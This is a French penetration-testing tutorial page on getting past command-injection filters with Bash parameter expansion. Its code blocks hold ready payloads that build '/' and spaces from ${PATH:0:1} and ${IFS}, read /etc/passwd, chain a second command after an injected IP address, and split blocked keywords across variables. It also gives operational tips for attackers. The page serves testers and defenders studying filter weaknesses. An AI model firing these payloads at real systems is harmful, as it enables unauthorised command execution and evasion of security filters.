---
order: 4
title: "Contournement de filtre d'injection de commande par expansion de variables et de paramètres"
description: "Assembler des commandes à partir de l'expansion de paramètres du shell, ${PATH:0:1} pour /, ${IFS} pour les espaces, découpage de sous-chaînes et substitution de motifs, pour que les caractères interdits et les mots-clés n'apparaissent jamais comme des littéraux dans la requête."
keywords:
  - injection de commande
  - expansion de paramètres
  - expansion de variables
  - IFS
  - expansion de sous-chaîne
  - contournement de filtre
---

# Expansion de variables et de paramètres

L'expansion de paramètres de Bash lit et transforme les variables d'environnement en ligne : `${VAR}`, les découpages de sous-chaîne `${VAR:offset:length}` et la substitution de motifs `${VAR//find/replace}`. Parce que le shell résout celles-ci en leurs valeurs avant d'exécuter la commande, un attaquant peut assembler des caractères interdits et même des noms de commandes entiers à partir de fragments de variables existantes, sans jamais taper le littéral bloqué lui-même.

## Pourquoi le shell le normalise

L'expansion de paramètres s'exécute avant le découpage en mots et l'exécution. `${PATH:0:1}` prend le premier caractère de `$PATH`, presque toujours `/`, de sorte que le shell émet une barre oblique que l'attaquant n'a jamais écrite. `${IFS}` se développe en le séparateur de champs interne (espace/tabulation/saut de ligne), fournissant un espace là où un filtre d'espace bloque le caractère littéral. Le filtre inspecte `${PATH:0:1}` ou `${IFS}` et ne voit ni `/` ni espace ; le shell les substitue à l'exécution. Le payload traverse le filtre sous forme de syntaxe de variable et arrive à la commande sous forme de caractères réels.

## Primitives de base

Produire une barre oblique sans en taper une :

```
${PATH:0:1}            # first char of PATH → "/"
${HOME:0:1}            # first char of HOME → "/"
${PWD:0:1}             # "/" from current dir
```

Produire un espace sans espace :

```
cat${IFS}/etc/passwd
cat${IFS%??}/etc/passwd   # trim trailing chars of IFS if needed
```

Assembler un chemin entièrement à partir de fragments, `/etc/passwd` sans aucune barre oblique littérale :

```
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

## Construire des noms de commandes à partir de variables

Les découpages de sous-chaîne peuvent extraire des lettres de valeurs de variables connues, et la substitution de motifs peut réécrire des caractères, utile lorsque le nom de la commande lui-même est sur liste de blocage :

```
# $0 is often "bash"; slice/transform to reach other words
${HOME:0:1}                      # "/"
${SHELL##*/}                     # "bash" from /bin/bash
```

La substitution de motifs réécrit une valeur pour forger une nouvelle chaîne. Par exemple, en transformant une variable qui contient une quasi-correspondance de la commande cible :

```
x=whoami; ${x/whoami/whoami}     # trivial illustration of substitution syntax
${PATH//:/ }                     # turn PATH separators into spaces to spray words
```

Plus concrètement, définissez une variable jetable dans le contexte injecté et développez-la, pour qu'aucun mot-clé bloqué n'apparaisse de manière contiguë :

```
a=who;b=ami;$a$b                 # concatenated expansion runs "whoami"
c=/etc/;cat ${c}passwd           # path split across a variable
```

Le shell concatène `$a$b` en `whoami` au moment de l'expansion ; la requête ne contient que `who`, `ami` et la syntaxe d'affectation.

## Combiner avec d'autres astuces

L'expansion de variables se compose avec l'expansion d'accolades, le globbing et les séparateurs :

```
{cat,${PATH:0:1}etc${PATH:0:1}passwd}
127.0.0.1;cat${IFS}${HOME:0:1}etc${HOME:0:1}passwd
```

Chaque morceau est produit par le shell, de sorte qu'une liste de blocage littérale pour `/`, les espaces ou `/etc/passwd` n'a rien à faire correspondre.

## Notes opérationnelles

- L'expansion de sous-chaîne (`${VAR:offset:length}`) et la substitution de motifs (`${VAR/a/b}`) sont des fonctionnalités de **Bash**, pas du `sh` POSIX ; confirmez que le sink lance Bash. `${IFS}` et le simple `${VAR}` fonctionnent plus largement.
- `${IFS}` vaut par défaut espace-tabulation-saut de ligne ; un seul `${IFS}` se découpe généralement en un séparateur, ce qui suffit entre une commande et son argument.
- Les valeurs des variables dépendent de l'environnement du processus enfant, `PATH`, `HOME` et `PWD` sont présents de manière fiable ; d'autres peuvent ne pas l'être.

## Outils

- **[Burp Suite](https://portswigger.net/burp)** : Repeater pour concevoir des payloads d'expansion de paramètres.
- **[commix](https://github.com/commixproject/commix)** : les scripts tamper automatisent les contournements d'espaces et de caractères.

## Références

- [PayloadsAllTheThings: Command Injection, Bypass without space / characters](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Bash Reference Manual: Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html)
